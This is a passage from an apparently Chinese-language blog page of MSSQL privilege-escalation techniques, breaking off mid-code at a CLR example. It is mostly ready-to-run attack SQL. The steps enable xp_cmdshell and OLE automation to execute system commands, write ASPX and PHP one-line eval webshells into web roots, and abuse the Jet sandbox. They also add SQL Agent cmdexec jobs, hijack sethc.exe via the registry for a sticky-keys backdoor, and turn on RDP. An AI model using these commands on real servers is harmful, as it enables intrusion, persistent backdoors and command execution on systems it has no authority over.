href="#xp-cmdshell提权" class="headerlink" title="xp_cmdshell提权"></a>xp_cmdshell提权</h4><p>xp_cmdshell在低版本中默认开启，由于存在安全隐患，在sqlserver2005以后，xp_cmdshell默认关闭利用xp_cmdshell执行系统命令</p><p>判断xp_cmdshell是否存在：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> master.dbo.sysobjects <span class="hljs-keyword">where</span> xtype<span class="hljs-operator">=</span><span class="hljs-string">&#x27;x&#x27;</span> <span class="hljs-keyword">and</span> name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>;  <span class="hljs-comment">-- 返回1即存在</span><br></code></pre></td></tr></table></figure><p>开关xp_cmdshell：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>, <span class="hljs-number">1</span>;RECONFIGURE;<span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>, <span class="hljs-number">1</span>;RECONFIGURE;  <span class="hljs-comment">-- 开启xp_cmdshell</span><br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>, <span class="hljs-number">1</span>;RECONFIGURE;<span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>, <span class="hljs-number">0</span>;RECONFIGURE;  <span class="hljs-comment">-- 关闭xp_cmdshell</span><br></code></pre></td></tr></table></figure><p>执行命令：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">exec</span> master..xp_cmdshell <span class="hljs-string">&#x27;xxx&#x27;</span>   <span class="hljs-comment">--  sqlserver2019被降权为mssql权限</span><br></code></pre></td></tr></table></figure><p>写webshell：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">exec</span> master..xp_cmdshell <span class="hljs-string">&#x27;echo ^&lt;%@ Page Language=&quot;Jscript&quot;%^&gt;^&lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%^&gt; &gt; c:\\WWW\\404.aspx&#x27;</span> ;<br></code></pre></td></tr></table></figure><p>xp_cmdshell被删除，需用sp_addextendedproc重新恢复或自己上传 xplog70.dll 进行恢复：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">EXEC</span> sp_addextendedproc xp_cmdshell ,<span class="hljs-variable">@dllname</span> <span class="hljs-operator">=</span><span class="hljs-string">&#x27;xplog70.dll&#x27;</span><br><span class="hljs-keyword">EXEC</span> sp_addextendedproc xp_enumgroups ,<span class="hljs-variable">@dllname</span> <span class="hljs-operator">=</span><span class="hljs-string">&#x27;xplog70.dll&#x27;</span><br><span class="hljs-keyword">EXEC</span> sp_addextendedproc xp_loginconfig ,<span class="hljs-variable">@dllname</span> <span class="hljs-operator">=</span><span class="hljs-string">&#x27;xplog70.dll&#x27;</span><br><span class="hljs-keyword">EXEC</span> sp_addextendedproc xp_enumerrorlogs ,<span class="hljs-variable">@dllname</span> <span class="hljs-operator">=</span><span class="hljs-string">&#x27;xpstar.dll&#x27;</span><br><span class="hljs-keyword">EXEC</span> sp_addextendedproc xp_getfiledetails ,<span class="hljs-variable">@dllname</span> <span class="hljs-operator">=</span><span class="hljs-string">&#x27;xpstar.dll&#x27;</span><br><span class="hljs-keyword">EXEC</span> sp_addextendedproc Sp_OACreate ,<span class="hljs-variable">@dllname</span> <span class="hljs-operator">=</span><span class="hljs-string">&#x27;odsole70.dll&#x27;</span><br><span class="hljs-keyword">EXEC</span> sp_addextendedproc Sp_OADestroy ,<span class="hljs-variable">@dllname</span> <span class="hljs-operator">=</span><span class="hljs-string">&#x27;odsole70.dll&#x27;</span><br><span class="hljs-keyword">EXEC</span> sp_addextendedproc Sp_OAGetErrorInfo ,<span class="hljs-variable">@dllname</span> <span class="hljs-operator">=</span><span class="hljs-string">&#x27;odsole70.dll&#x27;</span><br><span class="hljs-keyword">EXEC</span> sp_addextendedproc Sp_OAGetProperty ,<span class="hljs-variable">@dllname</span> <span class="hljs-operator">=</span><span class="hljs-string">&#x27;odsole70.dll&#x27;</span><br><span class="hljs-keyword">EXEC</span> sp_addextendedproc Sp_OAMethod ,<span class="hljs-variable">@dllname</span> <span class="hljs-operator">=</span><span class="hljs-string">&#x27;odsole70.dll&#x27;</span><br><span class="hljs-keyword">EXEC</span> sp_addextendedproc Sp_OASetProperty ,<span class="hljs-variable">@dllname</span> <span class="hljs-operator">=</span><span class="hljs-string">&#x27;odsole70.dll&#x27;</span><br><span class="hljs-keyword">EXEC</span> sp_addextendedproc Sp_OAStop ,<span class="hljs-variable">@dllname</span> <span class="hljs-operator">=</span><span class="hljs-string">&#x27;odsole70.dll&#x27;</span><br><span class="hljs-keyword">EXEC</span> sp_addextendedproc xp_regaddmultistring ,<span class="hljs-variable">@dllname</span> <span class="hljs-operator">=</span><span class="hljs-string">&#x27;xpstar.dll&#x27;</span><br><span class="hljs-keyword">EXEC</span> sp_addextendedproc xp_regdeletekey ,<span class="hljs-variable">@dllname</span> <span class="hljs-operator">=</span><span class="hljs-string">&#x27;xpstar.dll&#x27;</span><br><span class="hljs-keyword">EXEC</span> sp_addextendedproc xp_regdeletevalue ,<span class="hljs-variable">@dllname</span> <span class="hljs-operator">=</span><span class="hljs-string">&#x27;xpstar.dll&#x27;</span><br><span class="hljs-keyword">EXEC</span> sp_addextendedproc xp_regenumvalues ,<span class="hljs-variable">@dllname</span> <span class="hljs-operator">=</span><span class="hljs-string">&#x27;xpstar.dll&#x27;</span><br><span class="hljs-keyword">EXEC</span> sp_addextendedproc xp_regremovemultistring ,<span class="hljs-variable">@dllname</span> <span class="hljs-operator">=</span><span class="hljs-string">&#x27;xpstar.dll&#x27;</span><br><span class="hljs-keyword">EXEC</span> sp_addextendedproc xp_regwrite ,<span class="hljs-variable">@dllname</span> <span class="hljs-operator">=</span><span class="hljs-string">&#x27;xpstar.dll&#x27;</span><br><span class="hljs-keyword">EXEC</span> sp_addextendedproc xp_dirtree ,<span class="hljs-variable">@dllname</span> <span class="hljs-operator">=</span><span class="hljs-string">&#x27;xpstar.dll&#x27;</span><br><span class="hljs-keyword">EXEC</span> sp_addextendedproc xp_regread ,<span class="hljs-variable">@dllname</span> <span class="hljs-operator">=</span><span class="hljs-string">&#x27;xpstar.dll&#x27;</span><br><span class="hljs-keyword">EXEC</span> sp_addextendedproc xp_fixeddrives ,<span class="hljs-variable">@dllname</span> <span class="hljs-operator">=</span><span class="hljs-string">&#x27;xpstar.dll&#x27;</span><br></code></pre></td></tr></table></figure><p>例mssql2012的上传目录：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">C:<span class="hljs-symbol">\P</span>rogram Files<span class="hljs-symbol">\M</span>icrosoft SQL Server<span class="hljs-symbol">\M</span>SSQL12.MSSQLSERVER<span class="hljs-symbol">\M</span>SSQL<span class="hljs-symbol">\B</span>inn<span class="hljs-symbol">\x</span>plog70.dll<br></code></pre></td></tr></table></figure><h4 id="sp-oacreate和sp-oamethod提权"><a href="#sp-oacreate和sp-oamethod提权" class="headerlink" title="sp_oacreate和sp_oamethod提权"></a>sp_oacreate和sp_oamethod提权</h4><p>在xp_cmdshell被删除或不能利用是可以考虑利用sp_oacreate，利用前提需要sqlserver sysadmin账户服务器权限为system（sqlserver2019默认被降权为mssql）sp_oacreate 主要是用来调用OLE对象（Object Linking and Embedding的缩写，VB中的OLE对象），利用OLE对象的run方法执行系统命令</p><p>判断sp_oacreate是否存在：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> master.dbo.sysobjects <span class="hljs-keyword">where</span> xtype<span class="hljs-operator">=</span><span class="hljs-string">&#x27;x&#x27;</span> <span class="hljs-keyword">and</span> name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;SP_OACREATE&#x27;</span>  <span class="hljs-comment">-- 返回1即存在</span><br></code></pre></td></tr></table></figure><p>开关sp_oacreate：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 开启</span><br><span class="hljs-keyword">exec</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>,<span class="hljs-number">1</span>;reconfigure;<br><span class="hljs-keyword">exec</span> sp_configure <span class="hljs-string">&#x27;ole automation procedures&#x27;</span>,<span class="hljs-number">1</span>;reconfigure;<br><span class="hljs-comment">-- 关闭</span><br><span class="hljs-keyword">exec</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>,<span class="hljs-number">1</span>;reconfigure;<br><span class="hljs-keyword">exec</span> sp_configure <span class="hljs-string">&#x27;ole automation procedures&#x27;</span>,<span class="hljs-number">0</span>;reconfigure;<br></code></pre></td></tr></table></figure><p>利用wscript.shell组件执行命令：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 无回显执行系统命令</span><br><span class="hljs-keyword">declare</span> <span class="hljs-variable">@shell</span> <span class="hljs-type">int</span><br><span class="hljs-keyword">exec</span> sp_oacreate <span class="hljs-string">&#x27;wscript.shell&#x27;</span>,<span class="hljs-variable">@shell</span> output<br><span class="hljs-keyword">exec</span> sp_oamethod <span class="hljs-variable">@shell</span>,<span class="hljs-string">&#x27;run&#x27;</span>,<span class="hljs-keyword">null</span>,<span class="hljs-string">&#x27;C:\\Windows\\System32\\cmd.exe /c whoami&#x27;</span><br><br><span class="hljs-comment">-- 回显执行系统命令结果</span><br><span class="hljs-keyword">declare</span> <span class="hljs-variable">@shell</span> <span class="hljs-type">int</span>,<span class="hljs-variable">@exec</span> <span class="hljs-type">int</span>,<span class="hljs-variable">@text</span> <span class="hljs-type">int</span>,<span class="hljs-variable">@str</span> <span class="hljs-type">varchar</span>(<span class="hljs-number">8000</span>)<br><span class="hljs-keyword">exec</span> sp_oacreate <span class="hljs-string">&#x27;wscript.shell&#x27;</span>,<span class="hljs-variable">@shell</span> output<br><span class="hljs-keyword">exec</span> sp_oamethod <span class="hljs-variable">@shell</span>,<span class="hljs-string">&#x27;exec&#x27;</span>,<span class="hljs-variable">@exec</span> output,<span class="hljs-string">&#x27;C:\\Windows\\System32\\cmd.exe /c whoami&#x27;</span><br><span class="hljs-keyword">exec</span> sp_oamethod <span class="hljs-variable">@exec</span>, <span class="hljs-string">&#x27;StdOut&#x27;</span>, <span class="hljs-variable">@text</span> <span class="hljs-keyword">out</span><br><span class="hljs-keyword">exec</span> sp_oamethod <span class="hljs-variable">@text</span>, <span class="hljs-string">&#x27;readall&#x27;</span>, <span class="hljs-variable">@str</span> <span class="hljs-keyword">out</span><br><span class="hljs-keyword">select</span> <span class="hljs-variable">@str</span>;<br></code></pre></td></tr></table></figure><p>利用com组件执行命令：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">declare</span> <span class="hljs-variable">@ffffffff0x</span> <span class="hljs-type">int</span>,<span class="hljs-variable">@exec</span> <span class="hljs-type">int</span>,<span class="hljs-variable">@text</span> <span class="hljs-type">int</span>,<span class="hljs-variable">@str</span> <span class="hljs-type">varchar</span>(<span class="hljs-number">8000</span>)<br><span class="hljs-keyword">exec</span> sp_oacreate <span class="hljs-string">&#x27;&#123;72C24DD5-D70A-438B-8A42-98424B88AFB8&#125;&#x27;</span>,<span class="hljs-variable">@ffffffff0x</span> output<br><span class="hljs-keyword">exec</span> sp_oamethod <span class="hljs-variable">@ffffffff0x</span>,<span class="hljs-string">&#x27;exec&#x27;</span>,<span class="hljs-variable">@exec</span> output,<span class="hljs-string">&#x27;C:\\Windows\\System32\\cmd.exe /c whoami&#x27;</span><br><span class="hljs-keyword">exec</span> sp_oamethod <span class="hljs-variable">@exec</span>, <span class="hljs-string">&#x27;StdOut&#x27;</span>, <span class="hljs-variable">@text</span> <span class="hljs-keyword">out</span><br><span class="hljs-keyword">exec</span> sp_oamethod <span class="hljs-variable">@text</span>, <span class="hljs-string">&#x27;readall&#x27;</span>, <span class="hljs-variable">@str</span> <span class="hljs-keyword">out</span><br><span class="hljs-keyword">select</span> <span class="hljs-variable">@str</span>;<br></code></pre></td></tr></table></figure><p>利用filesystemobject写webshell（目录必须存在，否则也会显示成功，但是没有文件写入）:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">declare</span> <span class="hljs-variable">@o</span> <span class="hljs-type">int</span>, <span class="hljs-variable">@f</span> <span class="hljs-type">int</span>, <span class="hljs-variable">@t</span> <span class="hljs-type">int</span>, <span class="hljs-variable">@ret</span> <span class="hljs-type">int</span><br><span class="hljs-keyword">exec</span> sp_oacreate <span class="hljs-string">&#x27;scripting.filesystemobject&#x27;</span>, <span class="hljs-variable">@o</span> <span class="hljs-keyword">out</span><br><span class="hljs-keyword">exec</span> sp_oamethod <span class="hljs-variable">@o</span>, <span class="hljs-string">&#x27;createtextfile&#x27;</span>, <span class="hljs-variable">@f</span> <span class="hljs-keyword">out</span>, <span class="hljs-string">&#x27;C:\phpstudy_pro\www\1.php&#x27;</span>, <span class="hljs-number">1</span><br><span class="hljs-keyword">exec</span> <span class="hljs-variable">@ret</span> <span class="hljs-operator">=</span> sp_oamethod <span class="hljs-variable">@f</span>, <span class="hljs-string">&#x27;writeline&#x27;</span>, <span class="hljs-keyword">NULL</span>,<span class="hljs-string">&#x27;&lt;?php @eval($_REQUEST[&quot;a&quot;]);?&gt;&#x27;</span> <span class="hljs-comment">-- 在sqlserver2019+win server2019中测试，win defender会报毒并删除一句话木马</span><br></code></pre></td></tr></table></figure><h4 id="沙盒提权"><a href="#沙盒提权" class="headerlink" title="沙盒提权"></a>沙盒提权</h4><p>沙盒模式是数据库的一种安全功能在沙盒模式下，只对控件和字段属性中的安全且不含恶意代码的表达式求值如果表达式不使用可能以某种方式损坏数据的函数或属性，则可认为它是安全的，<br>利用前提需要sqlserver sysadmin账户服务器权限为system（sqlserver2019默认被降权为mssql），服务器拥有 jet.oledb.4.0 驱动 </p><p>局限：<br>（1）Microsoft.jet.oledb.4.0一般在32位操作系统上才可以<br>（2）Windows 2008以上 默认无 Access 数据库文件, 需要自己上传 sqlserver2015默认禁用Ad Hoc Distributed Queries，需要开启</p><p>开启Ad Hoc Distributed Queries：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 开启Ad Hoc Distributed Queries</span><br><span class="hljs-keyword">exec</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>,<span class="hljs-number">1</span>;reconfigure;<br><span class="hljs-keyword">exec</span> sp_configure <span class="hljs-string">&#x27;Ad Hoc Distributed Queries&#x27;</span>,<span class="hljs-number">1</span>;reconfigure;<br><span class="hljs-comment">-- 关闭Ad Hoc Distributed Queries</span><br><span class="hljs-keyword">exec</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>,<span class="hljs-number">1</span>;reconfigure;<br><span class="hljs-keyword">exec</span> sp_configure <span class="hljs-string">&#x27;Ad Hoc Distributed Queries&#x27;</span>,<span class="hljs-number">0</span>;reconfigure;<br></code></pre></td></tr></table></figure><p>关闭沙盒模式：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 关闭沙盒模式</span><br><span class="hljs-keyword">exec</span> master..xp_regwrite <span class="hljs-string">&#x27;HKEY_LOCAL_MACHINE&#x27;</span>,<span class="hljs-string">&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;</span>,<span class="hljs-string">&#x27;SandBoxMode&#x27;</span>,<span class="hljs-string">&#x27;REG_DWORD&#x27;</span>,<span class="hljs-number">0</span>;<br><span class="hljs-comment">-- 恢复默认沙盒模式</span><br><span class="hljs-keyword">exec</span> master..xp_regwrite <span class="hljs-string">&#x27;HKEY_LOCAL_MACHINE&#x27;</span>,<span class="hljs-string">&#x27;SOFTWARE\Microsoft\Jet\4.0\Engines&#x27;</span>,<span class="hljs-string">&#x27;SandBoxMode&#x27;</span>,<span class="hljs-string">&#x27;REG_DWORD&#x27;</span>,<span class="hljs-number">2</span>;<br></code></pre></td></tr></table></figure><p>沙盒模式参数含义：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ada">沙盒模式SandBoxMode参数含义（默认是<span class="hljs-number">2</span>）<br><span class="hljs-number">0</span>：在任何所有者中禁止启用安全模式<br><span class="hljs-number">1</span>：为仅在允许范围内<br><span class="hljs-number">2</span>：必须在<span class="hljs-keyword">access</span>模式下<br><span class="hljs-number">3</span>：完全开启<br><span class="hljs-comment">-- 查看沙盒模式</span><br>exec master.dbo.xp_regread <span class="hljs-symbol">&#x27;HKEY_LOCAL_MACHINE</span><span class="hljs-string">&#x27;,&#x27;</span>SOFTWARE\Microsoft\Jet\<span class="hljs-number">4.0</span>\Engines&#x27;, <span class="hljs-symbol">&#x27;SandBoxMode</span>&#x27;<br></code></pre></td></tr></table></figure><p>执行系统命令：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 执行系统命令</span><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> openrowset(<span class="hljs-string">&#x27;microsoft.jet.oledb.4.0&#x27;</span>,<span class="hljs-string">&#x27;;database=c:\windows\system32\ias\ias.mdb&#x27;</span>,<span class="hljs-string">&#x27;select shell(&quot;cmd.exe /c whoami&quot;)&#x27;</span>)<br></code></pre></td></tr></table></figure><h4 id="SQL-Server-Agent-Job提权"><a href="#SQL-Server-Agent-Job提权" class="headerlink" title="SQL Server Agent Job提权"></a>SQL Server Agent Job提权</h4><p>SQL Server 代理是一项 Microsoft Windows 服务，它执行计划的管理任务，这些任务在 SQL Server 中称为作业</p><p>启动sqlagent：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">exec</span> master.dbo.xp_servicecontrol <span class="hljs-string">&#x27;start&#x27;</span>,<span class="hljs-string">&#x27;SQLSERVERAGENT&#x27;</span>;<br></code></pre></td></tr></table></figure><p>执行命令：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql">use msdb;<br><span class="hljs-keyword">exec</span> sp_delete_job <span class="hljs-keyword">null</span>,<span class="hljs-string">&#x27;test&#x27;</span><br><span class="hljs-keyword">exec</span> sp_add_job <span class="hljs-string">&#x27;test&#x27;</span><br><span class="hljs-keyword">exec</span> sp_add_jobstep <span class="hljs-keyword">null</span>,<span class="hljs-string">&#x27;test&#x27;</span>,<span class="hljs-keyword">null</span>,<span class="hljs-string">&#x27;1&#x27;</span>,<span class="hljs-string">&#x27;cmdexec&#x27;</span>,<span class="hljs-string">&#x27;cmd /c &quot;whoami&gt;c:/1.txt&quot;&#x27;</span>  <span class="hljs-comment">-- 执行命令，并写入1.txt中</span><br><span class="hljs-keyword">exec</span> sp_add_jobserver <span class="hljs-keyword">null</span>,<span class="hljs-string">&#x27;test&#x27;</span>,@<span class="hljs-variable">@servername</span><br><span class="hljs-keyword">exec</span> sp_start_job <span class="hljs-string">&#x27;test&#x27;</span>;<br></code></pre></td></tr></table></figure><p>查询1.txt:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">Use model;<br>bulk <span class="hljs-keyword">insert</span> readfile <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;C:\1.txt&#x27;</span><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> readfile<br></code></pre></td></tr></table></figure><h4 id="xp-regwrite映像劫持提权"><a href="#xp-regwrite映像劫持提权" class="headerlink" title="xp_regwrite映像劫持提权"></a>xp_regwrite映像劫持提权</h4><p>xp_regread 与 xp_regwrite两个存储过程脚本可以直接读取与写入注册表，利用regwrite函数修改注册表，起到劫持作用利用前提sqlserver系统权限可以修改注册表</p><p>判断xp_regwrite是否存在：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> master.dbo.sysobjects <span class="hljs-keyword">where</span> xtype<span class="hljs-operator">=</span><span class="hljs-string">&#x27;x&#x27;</span> <span class="hljs-keyword">and</span> name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;xp_regwrite&#x27;</span>   <span class="hljs-comment">-- 返回1即存在</span><br></code></pre></td></tr></table></figure><p>开启xp_regwrite：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 开启</span><br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>,<span class="hljs-number">1</span>;RECONFIGURE<br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;xp_regwrite&#x27;</span>,<span class="hljs-number">1</span>;RECONFIGURE<br><span class="hljs-comment">-- 关闭</span><br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>,<span class="hljs-number">1</span>;RECONFIGURE<br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;xp_regwrite&#x27;</span>,<span class="hljs-number">0</span>;RECONFIGURE<br></code></pre></td></tr></table></figure><p>修改注册表来劫持粘滞键，将粘滞键修改为打开cmd 在sqlserver2019+winserver2019中测试，win defender和火绒均会拦截：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 劫持注册表</span><br><span class="hljs-keyword">EXEC</span> master..xp_regwrite <span class="hljs-variable">@rootkey</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;HKEY_LOCAL_MACHINE&#x27;</span>,<span class="hljs-variable">@key</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.EXE&#x27;</span>,<span class="hljs-variable">@value</span>_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;Debugger&#x27;</span>,<span class="hljs-variable">@type</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;REG_SZ&#x27;</span>,<span class="hljs-variable">@value</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;c:\windows\system32\cmd.exe&#x27;</span><br><span class="hljs-comment">-- 查看是否劫持成功</span><br><span class="hljs-keyword">EXEC</span> master..xp_regread <span class="hljs-string">&#x27;HKEY_LOCAL_MACHINE&#x27;</span>,<span class="hljs-string">&#x27;SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&#x27;</span>,<span class="hljs-string">&#x27;Debugger&#x27;</span><br></code></pre></td></tr></table></figure><p>劫持成功后连按5次shift会弹出cmd（win defender会拦截弹出的cmd并删除已经劫持的注册表） 还可以修改注册表来开启3389：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">exec</span> master.dbo.xp_regwrite<span class="hljs-string">&#x27;HKEY_LOCAL_MACHINE&#x27;</span>,<span class="hljs-string">&#x27;SYSTEM\CurrentControlSet\Control\Terminal Server&#x27;</span>,<span class="hljs-string">&#x27;fDenyTSConnections&#x27;</span>,<span class="hljs-string">&#x27;REG_DWORD&#x27;</span>,<span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><h4 id="CLR"><a href="#CLR" class="headerlink" title="CLR"></a>CLR</h4><p>Microsoft SQL Server 2005之后，实现了对 Microsoft .NET Framework 的公共语言运行时(CLR)的集成, CLR 集成使得现在可以使用 .NET Framework 语言编写代码，从而能够在 SQL Server 上运行，现在就可以通过 C# 来编写 SQL Server 自定义函数、存储过程、触发器等</p><p>开启CLR：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 开启CLR</span><br><span class="hljs-keyword">exec</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>,<span class="hljs-number">1</span>;RECONFIGURE;<br><span class="hljs-keyword">exec</span> sp_configure <span class="hljs-string">&#x27;clr enabled&#x27;</span>,<span class="hljs-number">1</span>;RECONFIGURE;<br><span class="hljs-comment">-- 关闭CLR</span><br><span class="hljs-keyword">exec</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>,<span class="hljs-number">1</span>;RECONFIGURE;<br><span class="hljs-keyword">exec</span> sp_configure <span class="hljs-string">&#x27;clr enabled&#x27;</span>,<span class="hljs-number">0</span>;RECONFIGURE;<br></code></pre></td></tr></table></figure><p>当导入了不安全的程序集之后，需将数据库标记为可信任的：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">ALTER</span> DATABASE master <span class="hljs-keyword">SET</span> TRUSTWORTHY <span class="hljs-keyword">ON</span>;<br></code></pre></td></tr></table></figure><p>做完上述准备之后需要编写一个CLR:</p><ol><li>visual studio创建一个sql server数据库项目</li><li>添加SQL CLR C# 存储过程</li><li>写入以下代码：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs 